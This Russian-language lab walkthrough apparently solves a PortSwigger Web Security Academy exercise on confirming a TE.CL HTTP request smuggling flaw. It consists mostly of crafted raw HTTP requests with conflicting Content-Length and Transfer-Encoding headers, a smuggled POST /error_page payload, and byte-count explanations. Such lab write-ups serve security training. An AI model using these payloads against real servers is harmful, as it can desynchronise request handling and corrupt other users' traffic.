Перейдем на уязвимый ресурс
Откроем `Proxy` -> `HTTP history`

и отправим в Repeater запрос на корневую страницу


Сразу же перейдем на версию HTTP 1.1
и изменим метод запроса на POST 

Тем самым получив такой запрос
```
POST / HTTP/1.1
Host: 0ad20077044b0c9487eab338007a00a8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
и 200 ответ


![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/5.%20HTTP%20request%20smuggling%2C%20confirming%20a%20TE.CL%20vulnerability%20via%20differential%20responses/pics%20for%20walkthrough/1.png)

Далее воспользуемся пикчей в попытках поиска, на чем работает фронтенд, а на чем бэкенд


![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/5.%20HTTP%20request%20smuggling%2C%20confirming%20a%20TE.CL%20vulnerability%20via%20differential%20responses/pics%20for%20walkthrough/2.png)
```
POST / HTTP/1.1
Host: 0ad20077044b0c9487eab338007a00a8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
```
и увидим, что выдало
`HTTP/1.1 400 Bad Request
{"error":"Invalid request"}
`
согласно пикче, это означает, что на фронет TE, а на бэкенде или CL или TE

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/5.%20HTTP%20request%20smuggling%2C%20confirming%20a%20TE.CL%20vulnerability%20via%20differential%20responses/pics%20for%20walkthrough/3.png)

Используем другой запрос
```
POST / HTTP/1.1
Host: 0ad20077044b0c9487eab338007a00a8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
В ответе получим таймаут, что согласно той же картинке, означает связку `TE.CL`
`Server Error: Communication timed out`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/5.%20HTTP%20request%20smuggling%2C%20confirming%20a%20TE.CL%20vulnerability%20via%20differential%20responses/pics%20for%20walkthrough/4.png)


Отлично, теперь мы разобрались кто что использует, теперь будем это все эксплуатировать

```
POST / HTTP/1.1
Host: 0ad20077044b0c9487eab338007a00a8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

6b
POST /error_page HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

something
0
```

отправим и получим 200 респонс статус код
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/5.%20HTTP%20request%20smuggling%2C%20confirming%20a%20TE.CL%20vulnerability%20via%20differential%20responses/pics%20for%20walkthrough/5.png)

и далее отправим обычный запрос 
```
POST / HTTP/1.1
Host: 0ad20077044b0c9487eab338007a00a8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

и получим заветные `Not found`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/5.%20HTTP%20request%20smuggling%2C%20confirming%20a%20TE.CL%20vulnerability%20via%20differential%20responses/pics%20for%20walkthrough/6.png)

А теперь разберемся в параметрах

сначала в нижнем запросе 
```
POST /error_page HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

something

0
```

17 в content-length потому что кусок 
`something

0`

занимает 16 байт, а нам нужно на 1 больше

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/5.%20HTTP%20request%20smuggling%2C%20confirming%20a%20TE.CL%20vulnerability%20via%20differential%20responses/pics%20for%20walkthrough/7.png)

в верхнем запросе
```
POST / HTTP/1.1
Host: 0ad20077044b0c9487eab338007a00a8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

6b

POST /error_page HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

something
```

занимаем `0x6b` байт - ВАЖНО \r\n после something НЕ УЧИТЫВАЮТСЯ!
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/5.%20HTTP%20request%20smuggling%2C%20confirming%20a%20TE.CL%20vulnerability%20via%20differential%20responses/pics%20for%20walkthrough/8.png)

ну а Content-Length: 4 потому что 6b\r\n заниимают 4 байта
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/5.%20HTTP%20request%20smuggling%2C%20confirming%20a%20TE.CL%20vulnerability%20via%20differential%20responses/pics%20for%20walkthrough/9.png)
